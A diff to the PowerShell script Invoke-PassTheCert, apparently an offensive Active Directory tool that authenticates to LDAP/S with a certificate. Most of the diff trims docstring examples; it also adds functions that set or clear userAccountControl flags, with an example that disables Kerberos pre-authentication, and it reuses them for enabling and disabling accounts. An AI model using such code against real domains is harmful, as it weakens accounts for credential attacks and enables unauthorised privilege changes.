@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.5.8 "
+    Write-Host -ForegroundColor Red     "   v1.6.0 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -6337,7 +6337,6 @@ function _Helper-GetSIDTokenOfSID {
 
 
 
-
 # ========================================================
 # ===         Helper Functions (Certificates)          ===
 # ========================================================
@@ -6397,7 +6396,6 @@ function _Helper-ExportRSAPublicKeyBCrypt {
 }
 
 
-
 function _Helper-ExportRSAPublicKeyDER {
     
     <#
@@ -6436,7 +6434,6 @@ function _Helper-ExportRSAPublicKeyDER {
 
     return $Certificate.PublicKey.EncodedKeyValue.RawData
 }
-
 
 
 function _Helper-GenerateSelfSignedCertificate() {
@@ -6537,7 +6534,6 @@ function _Helper-GenerateSelfSignedCertificate() {
         [DateTimeOffset]::Now.AddYears($AddYear)
     )
 }
-
 
 
 function _Helper-ExportCertificateToFile {
@@ -6797,12 +6793,6 @@ function _GetIssuerDNFromLdapConnection {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection
 
             Returns `CN=ADLAB-DC02-CA,DC=X` if the client certificate-authenticated to CA Issuer `CN=ADLAB-DC02-CA,DC=X`
@@ -6844,12 +6834,6 @@ function _GetSubjectDNFromLdapConnection {
             [System.DirectoryServices.Protocols.LdapConnection] 
             
             The established LDAP Connection Instance.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -6896,12 +6880,6 @@ function _GetDomainDNOfCAIssuerFromLdapConnection {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _GetDomainDNOfCAIssuerFromLdapConnection -LdapConnection $LdapConnection
 
             Returns `DC=X` if the client certificate-authenticated to Issuer `CN=ADLAB-DC02-CA, DC=X`
@@ -6942,12 +6920,6 @@ function _GetDomainDNOfSubjectFromLdapConnection {
             [System.DirectoryServices.Protocols.LdapConnection] 
             
             The established LDAP Connection Instance.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -7243,12 +7215,6 @@ function _GetAttributeOfObject {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN 'CN=Administrator,CN=Users,DC=X' -Attribute 'sAMAccountName'
 
             Returns `Administrator` (i.e. the content of the attribute `CN=Administrator,CN=Users,DC=X`:`sAMAccountName` attribute)
@@ -7380,13 +7346,7 @@ function _GetIndexOfInboundACE {
 
             [System.String] 
             
-            The destination object's identity of the ACE to search (i.e. targeted object against which the ACE applies)
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
+            The destination object's identity of the ACE to search (i.e. targeted object against which the ACE applies).
 
         .EXAMPLE
 
@@ -7491,9 +7451,6 @@ function _GetIndexOfInboundACE {
 
 
 
-
-
-
 # ===========================================================
 # ===    Invoke-PassTheCert Building Blocks Functions     ===
 # ===========================================================
@@ -7512,12 +7469,6 @@ function _LDAPExtendedOperationWhoami {
             [System.DirectoryServices.Protocols.LdapConnection] 
             
             The established LDAP Connection Instance.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -7602,12 +7553,6 @@ function _LDAPExtendedOperationPasswordModify {
             [System.String] 
             
             The new password to set.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -7744,12 +7689,6 @@ function _Filter {
             [System.String] 
             
             The SID to be filtered from the LDAP lookup (e.g. 'S-1-5-21-2539905369-2457893589-779357875-500')
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -8055,7 +7994,7 @@ function _Filter {
                     #   serviceprincipalname    : CIFS/DC01
                     #                             LDAP/DC01
                     # However, some very long array binaries (e.g. 'usercertificate') are not interesting to split. Hence, we'll whitelist the interesting multi-valued attributes to CRLF-split.
-                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink', 'namingcontexts', 'supportedcontrol', 'supportedsaslmechanisms', 'supportedcapabilities', 'supportedldappolicies', 'certificatetemplates', 'mspki-certificate-application-policy', 'pkicriticalextensions', 'pkiextendedkeyusage', 'pkidefaultcsps', 'msds-allowedtodelegateto')) {
+                    if ($Attribute -in @('objectClass', 'serviceprincipalname', 'memberof', 'msds-keycredentiallink', 'namingcontexts', 'supportedcontrol', 'supportedsaslmechanisms', 'supportedcapabilities', 'supportedldappolicies', 'certificatetemplates', 'mspki-certificate-application-policy', 'pkicriticalextensions', 'pkiextendedkeyusage', 'pkidefaultcsps', 'msds-allowedtodelegateto', 'otherwellknownobjects', 'wellknownobjects', 'subrefs')) {
                         $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $($AttributeObject -join "`r`n")
                     } else {
                         $ResultObject | Add-Member -Force -NotePropertyName $Attribute -NotePropertyValue $AttributeObject
@@ -8269,12 +8208,6 @@ function _CreateObject {
             - The `sAMAccountName` MUST be 20 characters MAXIMUM
             - (Computers) Defaults to `<CN>$`, where `<CN>` is the first `CN` part of the DN (e.g. `DC137337$` if the specified DN is `CN=DC137337,CN=Computers,DC=X` (yeah... yet another DC...))
             - (Groups) Defaults to `<CN>`, where `<CN>` is the first `CN` part of the DN (e.g. `Group733731` if the specified DN is `CN=Group733731,CN=Builtin,DC=X` (yeah... yet another group...))
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -8597,12 +8530,6 @@ function _DeleteObject {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _DeleteObject -LdapConnection $LdapConnection -ObjectDN 'CN=TSOL,OU=INTOTHEWILD,DC=X'
 
             Deletes the object `CN=TSOL,OU=INTOTHEWILD,DC=X`
@@ -8681,12 +8608,6 @@ function _GetInboundACEs {
             [System.String] 
             
             The identity of the targeted object whose inbound ACEs must be retrieved.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -8902,12 +8823,6 @@ function _CreateInboundACE {
             - If not specified, defaults to $null.
             - NOT REQUIRED if -AccessRightName is specified.
             - What can happen if an invalid `ObjectAceType` GUID is provided, such as '12345678-1234-1234-1234-123456789012' ? ¯\_(*_*)_/¯
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -9210,12 +9125,6 @@ function _DeleteInboundACE {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _DeleteInboundACE -LdapConnection $LdapConnection -IdentityDN 'CN=Zack ZS. STRIFE,CN=Users,DC=X' -TargetDN 'CN=ESARVI01,CN=Computers,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'GenericAll'
 
             Deletes the inbound ACE `[AceQualifier='AccessAllowed', AccessMasks='GenericAll', ObjectAceType=NULL]` provided to the principal `Zack ZS. STRIFE` towards the computer target object `ESARVI01` (as per `PrincipalToComputer.txt`). In other words, `Zack ZS. STRIFE` will no longer have `GenericAll` rights over the target `ESARVI01`.
@@ -9367,12 +9276,6 @@ function _GetInboundSDDLs {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _GetInboundSDDLs -LdapConnection $LdapConnection -ObjectDN 'CN=John JD. DOE,CN=Users,DC=X'
 
             Get the SDDL String of all the inbound ACEs applied against the `John JD. DOE` object.
@@ -9497,12 +9400,6 @@ function _CreateInboundSDDL {
             The attribute of the targeted object against which the SDDL ACE entry applies. (Optional)
 
             - If not specified, the created ACE entry won't have an `ObjectAceType` GUID.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -9705,12 +9602,6 @@ function _UpdatePasswordOfIdentity {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _UpdatePasswordOfIdentity -LdapConnection $LdapConnection -IdentityDN 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword 'NewP@ssw0rd123!'
 
             Updates the password of account `Wordy WP. PRESS` to `NewP@ssw0rd123!`
@@ -9778,12 +9669,6 @@ function _OverwriteValueInAttribute {
         .PARAMETER Value
             
             The new value to set on the specified attribute (e.g. '!D3$cR1Pt4t0R!').
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -9879,12 +9764,6 @@ function _AddValueInAttribute {
         .PARAMETER Value
             
             The value to add into the specified attribute
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -9985,12 +9864,6 @@ function _RemoveValueInAttribute {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _RemoveValueInAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Kobalt KS. STRIKE,CN=Users,DC=X' -Attribute 'description' -Value 'Cat&Ctrl'
 
             Removes the value `Cat&Ctrl` from attribute `description` of object `Kobalt KS. STRIKE`, only if the attribute's value was already set to `Cat&Ctrl`. Being a single-valued attribute, then this would leave it empty.
@@ -10083,12 +9956,6 @@ function _ClearAttribute {
 
         .EXAMPLE
 
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
-
-        .EXAMPLE
-
             _ClearAttribute -LdapConnection $LdapConnection -ObjectDN 'CN=Ima IA. APPLY,CN=Users,DC=X' -Attribute 'description'
 
             Clears the value stored into the `description` of the object `Ima IA. APPLY`, only if the attribute contained a value.
@@ -10147,6 +10014,174 @@ function _ClearAttribute {
 }
 
 
+function _AddUACFlags {
+    
+    <#
+
+        .SYNOPSIS
+
+            Adds the specified UAC Flag(s) (comma-separated, if multiple) into the provided object's UAC attribute.
+
+        .PARAMETER LdapConnection
+
+            [System.DirectoryServices.Protocols.LdapConnection] 
+            
+            The established LDAP Connection Instance.
+
+        .PARAMETER IdentityDN
+
+            [System.String] 
+            
+            The identity of the principal whose UAC attribute is to be modified.
+
+        .PARAMETER UACFlags
+
+            [System.String] 
+            
+            The UAC Flag(s) (comma-separated, if multiple) to add into the principal's UAC attribute.
+    
+        .EXAMPLE
+
+            _AddUACFlags -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. Doe,OU=Users,DC=X' -UACFlags 'DONT_REQ_PREAUTH'
+
+            Adds the `DONT_REQ_PREAUTH` UAC Flag into the `John JD. Doe`:`useraccountcontrol` attribute.
+
+        .LINK
+
+            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries (ACEs)
+
+        .LINK
+
+            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties (UAC Flags)
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
+        [ValidateNotNullorEmpty()]
+        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the principal whose UAC attribute is to be modified")]
+        [System.String]$IdentityDN,
+
+        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the UAC Flag(s) (comma-separated, if multiple) to add into the principal's UAC attribute")]
+        [System.String]$UACFlags
+    )
+    
+    Write-Verbose "[*] Adding UAC Flag(s) '$UACFlags' Into Account '$IdentityDN'..."
+    
+    [System.Int32]$UAC = _Helper-GetValueOfUACFlags -UACFlags (
+        (_Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope 'Base' -Properties 'userAccountControl').useraccountcontrol
+    )
+
+    # For each specified UAC Flag (comma-separated, if multiple)
+    $Overwrite = $false
+    foreach ($UACFlag in $UACFlags -split ',') {
+        [System.Int32]$UACValue = _Helper-GetValueOfUACFlags -UACFlags $UACFlag.Trim()
+        # If UAC Flag is absent
+        if (-not (($UAC -band $UACValue) -gt 0)) {
+            # Add it (i.e. bitwise OR with FLAG)
+            $UAC = $UAC -bor $UACValue
+            $Overwrite = $true
+        } else {
+            Write-Host "[!] UAC Flag '$UACFlag' In Account '$IdentityDN' Already Exists !"
+        }
+    }
+
+    if ($Overwrite) {
+        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'userAccountControl' -Value $UAC.ToString()
+    }
+
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties 'userAccountControl' |fl"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'RemoveUACFlags' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -UACFlags '$UACFlags'"
+}
+
+
+function _RemoveUACFlags {
+    
+    <#
+
+        .SYNOPSIS
+
+            Removes the specified UAC Flag(s) (comma-separated, if multiple) from the provided object's UAC attribute.
+
+        .PARAMETER LdapConnection
+
+            [System.DirectoryServices.Protocols.LdapConnection] 
+            
+            The established LDAP Connection Instance.
+
+        .PARAMETER IdentityDN
+
+            [System.String] 
+            
+            The identity of the principal whose UAC attribute is to be modified.
+
+        .PARAMETER UACFlags
+
+            [System.String] 
+            
+            The UAC Flag(s) (comma-separated, if multiple) to remove from the principal's UAC attribute.
+    
+        .EXAMPLE
+
+            _RemoveUACFlags -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. Doe,OU=Users,DC=X' -UACFlags 'DONT_REQ_PREAUTH'
+
+            Removes the `DONT_REQ_PREAUTH` UAC Flag from the `John JD. Doe`:`useraccountcontrol` attribute.
+
+        .LINK
+
+            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries (ACEs)
+
+        .LINK
+
+            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties (UAC Flags)
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
+        [ValidateNotNullorEmpty()]
+        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity of the principal whose UAC attribute is to be modified")]
+        [System.String]$IdentityDN,
+
+        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the UAC Flag(s) (comma-separated, if multiple) to remove from the principal's UAC attribute")]
+        [System.String]$UACFlags
+    )
+
+    Write-Verbose "[*] Removing UAC Flag(s) '$UACFlags' From Account '$IdentityDN'..."
+    
+    [System.Int32]$UAC = _Helper-GetValueOfUACFlags -UACFlags (
+        (_Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope 'Base' -Properties 'userAccountControl').useraccountcontrol
+    )
+    
+    # For each specified UAC Flag (comma-separated, if multiple)
+    $Overwrite = $false
+    foreach ($UACFlag in $UACFlags -split ',') {
+        [System.Int32]$UACValue = _Helper-GetValueOfUACFlags -UACFlags $UACFlag.Trim()
+        # If UAC Flag is present
+        if (($UAC -band $UACValue) -gt 0) {
+            # Remove it (i.e. bitwise AND with NOT flag)
+            $UAC = $UAC -band (-bnot $UACValue)
+            $Overwrite = $true
+        } else {
+            Write-Host "[!] UAC Flag '$UACFlag' In Account '$IdentityDN' Doesn't Exist !"
+        }
+    }
+
+    if ($Overwrite) {
+        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'userAccountControl' -Value $UAC.ToString()
+    }
+
+    Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$IdentityDN' -SearchScope Base -Properties 'userAccountControl' |fl"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'AddUACFlags' -LdapConnection `$LdapConnection -Identity '$IdentityDN' -UACFlags '$UACFlags'"
+}
+
+
 function _ShowStatusOfAccount {
     
     <#
@@ -10166,12 +10201,6 @@ function _ShowStatusOfAccount {
             [System.String] 
             
             The identity of the principal whose status must be shown.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -10209,25 +10238,15 @@ function _ShowStatusOfAccount {
 
     Write-Verbose "[*] Checking Status Of Account '$IdentityDN'..."
 
-    $SearchResponse = $LdapConnection.SendRequest(
-        (New-Object System.DirectoryServices.Protocols.SearchRequest(
-            $IdentityDN, 
-            '(objectClass=person)', 
-            [System.DirectoryServices.SearchScope]::Base
-        ))
+    [System.Int32]$UAC = _Helper-GetValueOfUACFlags -UACFlags (
+        (_Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope 'Base' -Properties 'userAccountControl').useraccountcontrol
     )
+    [System.Int32]$AccountDisabled = 0x0002;
 
-    if ($SearchResponse.Entries.Count -eq 0) {
-        return "[!] Account '$IdentityDN' Not Found (Either Inexistent, Or Not Of Class 'person') !"
+    if (($UAC.ToString() -band $AccountDisabled) -gt 0) {
+        return "[*] Account '$IdentityDN' Is Disabled.";
     } else {
-        [System.Int32]$UAC = [System.Int32]($SearchResponse.Entries[0].Attributes["userAccountControl"][0].ToString())
-        [System.Int32]$AccountDisabled = 0x0002;
-        
-        if (($UAC -band $AccountDisabled) -gt 0) {
-            return "[*] Account '$IdentityDN' Is Disabled.";
-        } else {
-            return "[*] Account '$IdentityDN' Is Enabled.";
-        }
+        return "[*] Account '$IdentityDN' Is Enabled.";
     }
 }
 
@@ -10251,12 +10270,6 @@ function _EnableAccount {
             [System.String] 
             
             The identity of the principal whose status must be enabled.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -10288,29 +10301,10 @@ function _EnableAccount {
 
     Write-Verbose "[*] Enabling Account '$IdentityDN'..."
 
-    $SearchResponse = $LdapConnection.SendRequest(
-        (New-Object System.DirectoryServices.Protocols.SearchRequest(
-            $IdentityDN,
-            '(objectClass=person)', 
-            [System.DirectoryServices.SearchScope]::Base
-        ))
-    )
+    _RemoveUACFlags -LdapConnection $LdapConnection -IdentityDN $IdentityDN -UACFlags 'ACCOUNTDISABLE'
 
-    [System.Int32]$UAC = _Helper-GetValueOfUACFlags -UACFlags (
-        (_Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope 'Base' -Properties 'userAccountControl').useraccountcontrol
-    )
-    [System.Int32]$AccountDisabled = 0x0002;
-
-    # If the account is disabled,
-    if (($UAC -band $AccountDisabled) -gt 0) {
-        # Enable it (i.e. bitwise AND with NOT flag)
-        $UAC = $UAC -band (-bnot $AccountDisabled)
-        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'userAccountControl' -Value $UAC.ToString()
-        Write-Host "[+] Successfully Enabled Account '$IdentityDN' !"
-    } else {
-        Write-Host "[!] Account '$IdentityDN' Is Already Enabled !"
-    }
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'ShowStatusOfAccount' -LdapConnection `$LdapConnection -Identity '$IdentityDN'"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DisableAccount' -LdapConnection `$LdapConnection -Identity '$IdentityDN'"
 }
 
 
@@ -10333,12 +10327,6 @@ function _DisableAccount {
             [System.String] 
             
             The identity of the principal whose status must be disabled.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -10370,21 +10358,10 @@ function _DisableAccount {
 
     Write-Verbose "[*] Disabling Account '$IdentityDN'..."
 
-    [System.Int32]$UAC = _Helper-GetValueOfUACFlags -UACFlags (
-        (_Filter -LdapConnection $LdapConnection -SearchBase $IdentityDN -SearchScope 'Base' -Properties 'userAccountControl').useraccountcontrol
-    )
-    [System.Int32]$AccountDisabled = 0x0002;
+    _AddUACFlags -LdapConnection $LdapConnection -IdentityDN $IdentityDN -UACFlags 'ACCOUNTDISABLE'
 
-    # If the account is enabled
-    if (-not (($UAC -band $AccountDisabled) -gt 0)) {
-        # Disable it (i.e. bitwise OR with FLAG)
-        $UAC = $UAC -bor $AccountDisabled
-        _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'userAccountControl' -Value $UAC.ToString()
-        Write-Host "[+] Successfully Disabled Account '$IdentityDN' !"
-    } else {
-        Write-Host "[!] Account '$IdentityDN' Is Already Disabled !"
-    }
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'ShowStatusOfAccount' -LdapConnection `$LdapConnection -Identity '$IdentityDN'"
+    Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'EnableAccount' -LdapConnection `$LdapConnection -Identity '$IdentityDN'"
 }
 
 
@@ -10415,12 +10392,6 @@ function _AddGroupMember {
             [System.String] 
             
             The identity of the group in which a member must be added.
-
-        .EXAMPLE
-
-            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']
-
-            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.
 
         .EXAMPLE
 
@@ -10455,20 +10426,11 @@ function _AddGroupMember {
 
